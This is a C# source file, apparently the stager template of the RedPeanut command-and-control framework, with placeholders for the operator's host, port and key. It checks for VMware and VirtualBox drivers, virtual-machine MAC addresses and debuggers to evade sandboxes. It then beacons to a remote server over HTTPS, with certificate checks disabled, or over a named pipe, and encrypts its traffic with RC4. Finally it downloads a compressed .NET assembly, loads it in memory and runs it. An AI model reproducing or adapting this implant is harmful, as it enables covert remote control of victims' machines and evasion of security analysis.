using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;

public class RedPeanutRP
{
    public RedPeanutRP()
    {
        try
            {
    	if(!containsSandboxArtifacts() && !isBadMac() && !isDebugged())
          Execute();
          }
            catch (WebException )
            {
                
            }
    }

    static void Main(string[] args)
    {
        if(!containsSandboxArtifacts() && !isBadMac() && !isDebugged())
        	Execute();
    }

    public static void Execute()
    {
        string[] pageget = {
            #PAGEGET#
        };

        string[] pagepost = {
            #PAGEPOST#
        };

        string param = "#PARAM#";
        string serverkey = "#SERVERKEY#";
        string host = "#HOST#";

        string namedpipe = "#PIPENAME#";

        int port = 0;
        int targetframework = 40;

        Int32.TryParse("#PORT#", out port);
        Int32.TryParse("#FRAMEWORK#", out targetframework);

        Thread.Sleep(10000);
        AgentIdReqMsg agentIdReqMsg = new AgentIdReqMsg();
        agentIdReqMsg.address = host;
        agentIdReqMsg.port = port;
        agentIdReqMsg.request = "agentid";
        agentIdReqMsg.framework = targetframework;
        

        string agentidrequesttemplate = new JavaScriptSerializer().Serialize(agentIdReqMsg);
        bool agentexit = false;

        while (true && !agentexit)
        {
            try
            {
                string resp = "";
                string cookievalue = "";
                NamedPipeClientStream pipe = null;
                if (string.IsNullOrEmpty(namedpipe))
                {
                    CookiedWebClient wc = new CookiedWebClient();
                    wc.UseDefaultCredentials = true;
                    wc.Proxy = WebRequest.DefaultWebProxy;
                    wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

                    WebHeaderCollection webHeaderCollection = new WebHeaderCollection();

                    webHeaderCollection.Add(HttpRequestHeader.UserAgent, "#USERAGENT#");

                    #HEADERS#

                    wc.Headers = webHeaderCollection;

                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                    ServicePointManager.DefaultConnectionLimit = 9999;
                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });

                    string post = String.Format("{0}={1}", param, EncryptMessage(serverkey, agentidrequesttemplate));
                    string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)], post);

                    resp = wc.UploadString(rpaddress, post);
                    
                    Cookie cookie = wc.ResponseCookies["sessionid"];
                    cookievalue = cookie.Value;
                }
                else
                {
                    try
                    {

                        pipe = new NamedPipeClientStream(host, namedpipe, PipeDirection.InOut, PipeOptions.Asynchronous);
                        pipe.Connect(5000);
                        pipe.ReadMode = PipeTransmissionMode.Message;

                        //Write AgentIdReqMsg
                        var agentIdrequest = EncryptMessage(serverkey, agentidrequesttemplate);
                        pipe.Write(Encoding.Default.GetBytes(agentIdrequest), 0, agentIdrequest.Length);

                        var messageBytes = ReadMessage(pipe);
                        resp = Encoding.UTF8.GetString(messageBytes);
                    }
                    catch (Exception)
                    {

                    }
                }

                var line = DecryptMessage(serverkey, resp);
                AgentIdMsg agentIdMsg = new JavaScriptSerializer().Deserialize<AgentIdMsg>(line);

                object[] agrsstage = new object[] {
                             line, cookievalue, pipe
                            };

                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(getPayload(agentIdMsg.stage));
                assembly.GetTypes()[0].GetMethods()[0].Invoke(null, agrsstage);
            }
            catch (WebException)
            {
                Thread.Sleep(30000);
            }
            catch (SystemException e)
            {
                if(e.Data.Contains("reason"))
                    if(e.Data["reason"].Equals("exit"))
                        agentexit = true;
            }
        }
    }

    private class CookiedWebClient : WebClient
    {
        public CookiedWebClient()
        {
            CookieContainer = new CookieContainer();
            this.ResponseCookies = new CookieCollection();
        }

        public CookieContainer CookieContainer { get; private set; }
        public CookieCollection ResponseCookies { get; set; }

        public void Add(Cookie cookie)
        {
            this.CookieContainer.Add(cookie);
        }

        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = (HttpWebRequest)base.GetWebRequest(address);
            request.CookieContainer = CookieContainer;
            return request;
        }

        protected override WebResponse GetWebResponse(WebRequest request)
        {
            var response = (HttpWebResponse)base.GetWebResponse(request);
            this.ResponseCookies = response.Cookies;
            return response;
        }
    }

    private static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }

    }

    private static byte[] getPayload(string payload)
    {

        return DecompressDLL(Convert.FromBase64String(payload));
    }

    private static byte[] ReadMessage(PipeStream pipe)
    {
        byte[] buffer = new byte[1024];
        using (var ms = new MemoryStream())
        {
            do
            {
                var readBytes = pipe.Read(buffer, 0, buffer.Length);
                ms.Write(buffer, 0, readBytes);
            }
            while (!pipe.IsMessageComplete);

            return ms.ToArray();
        }
    }
    
    //Sharpshooter
    // Returns true if possible sandbox artifacts exist on file system
    public static bool containsSandboxArtifacts()
    {
        List<string> EvidenceOfSandbox = new List<string>();
        string[] FilePaths = {@"C:\windows\Sysnative\Drivers\Vmmouse.sys",
        @"C:\windows\Sysnative\Drivers\vm3dgl.dll", @"C:\windows\Sysnative\Drivers\vmdum.dll",
        @"C:\windows\Sysnative\Drivers\vm3dver.dll", @"C:\windows\Sysnative\Drivers\vmtray.dll",
        @"C:\windows\Sysnative\Drivers\vmci.sys", @"C:\windows\Sysnative\Drivers\vmusbmouse.sys",
        @"C:\windows\Sysnative\Drivers\vmx_svga.sys", @"C:\windows\Sysnative\Drivers\vmxnet.sys",
        @"C:\windows\Sysnative\Drivers\VMToolsHook.dll", @"C:\windows\Sysnative\Drivers\vmhgfs.dll",
        @"C:\windows\Sysnative\Drivers\vmmousever.dll", @"C:\windows\Sysnative\Drivers\vmGuestLib.dll",
        @"C:\windows\Sysnative\Drivers\VmGuestLibJava.dll", @"C:\windows\Sysnative\Drivers\vmscsi.sys",
        @"C:\windows\Sysnative\Drivers\VBoxMouse.sys", @"C:\windows\Sysnative\Drivers\VBoxGuest.sys",
        @"C:\windows\Sysnative\Drivers\VBoxSF.sys", @"C:\windows\Sysnative\Drivers\VBoxVideo.sys",
        @"C:\windows\Sysnative\vboxdisp.dll", @"C:\windows\Sysnative\vboxhook.dll",
        @"C:\windows\Sysnative\vboxmrxnp.dll", @"C:\windows\Sysnative\vboxogl.dll",
        @"C:\windows\Sysnative\vboxoglarrayspu.dll", @"C:\windows\Sysnative\vboxoglcrutil.dll",
        @"C:\windows\Sysnative\vboxoglerrorspu.dll", @"C:\windows\Sysnative\vboxoglfeedbackspu.dll",
        @"C:\windows\Sysnative\vboxoglpackspu.dll", @"C:\windows\Sysnative\vboxoglpassthroughspu.dll",
        @"C:\windows\Sysnative\vboxservice.exe", @"C:\windows\Sysnative\vboxtray.exe",
        @"C:\windows\Sysnative\VBoxControl.exe"};
        foreach (string FilePath in FilePaths)
        {
            if (File.Exists(FilePath))
            {
                EvidenceOfSandbox.Add(FilePath);
            }
        }

        if (EvidenceOfSandbox.Count == 0)
        {
            return false;
        }
        else
        {
            return true;
        }
    }

	//Sharpshooter
    // Return true is machine matches a bad MAC vendor
    public static bool isBadMac()
    {
        List<string> EvidenceOfSandbox = new List<string>();

        string[] badMacAddresses = { @"000C29", @"001C14", @"005056", @"000569", @"080027" };

        NetworkInterface[] NICs = NetworkInterface.GetAllNetworkInterfaces();
        foreach (NetworkInterface NIC in NICs)
        {
            foreach (string badMacAddress in badMacAddresses)
            {
                if (NIC.GetPhysicalAddress().ToString().ToLower().Contains(badMacAddress.ToLower()))
                {
                    EvidenceOfSandbox.Add(Regex.Replace(NIC.GetPhysicalAddress().ToString(), ".{2}", "$0:").TrimEnd(':'));
                }
            }
        }

        if (EvidenceOfSandbox.Count == 0)
        {
            return false;
        }
        else
        {
            return true;
        }

    }
    
    //Sharpshooter
    // Return true if a debugger is attached
    private static bool isDebugged()
    {
        if (System.Diagnostics.Debugger.IsAttached)
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    

    private static string DecryptMessage(string sessionkey, string input)
    {
        return RC4.Decrypt(sessionkey, input);
    }

    private static string EncryptMessage(string sessionkey, string input)
    {
        return RC4.Encrypt(sessionkey, input);
    }

    
}

public static class RC4
    {
        public static string Encrypt(string key, string data)
        {
            Encoding unicode = Encoding.Unicode;

            return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
        }

        public static string Decrypt(string key, string data)
        {
            Encoding unicode = Encoding.Unicode;

            return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));
        }

        public static byte[] Encrypt(byte[] key, byte[] data)
        {
            return EncryptOutput(key, data).ToArray();
        }

        public static byte[] Decrypt(byte[] key, byte[] data)
        {
            return EncryptOutput(key, data).ToArray();
        }

        private static byte[] EncryptInitalize(byte[] key)
        {
            byte[] s = Enumerable.Range(0, 256)
              .Select(i => (byte)i)
              .ToArray();

            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + key[i % key.Length] + s[i]) & 255;

                Swap(s, i, j);
            }

            return s;
        }

        private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = EncryptInitalize(key);

            int i = 0;
            int j = 0;

            return data.Select((b) =>
            {
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;

                Swap(s, i, j);

                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }

        private static void Swap(byte[] s, int i, int j)
        {
            byte c = s[i];

            s[i] = s[j];
            s[j] = c;
        }
    }

public class AgentIdMsg
{
    public string agentid { get; set; }
    public string sessionkey { get; set; }
    public string sessioniv { get; set; }
    public string stage { get; set; }
}

public class AgentIdReqMsg
    {
        public string AgentPivot { get; set; }
        public string address { get; set; }
        public int port { get; set; }
        public int framework { get; set; }
        public string request { get; set; }
    }


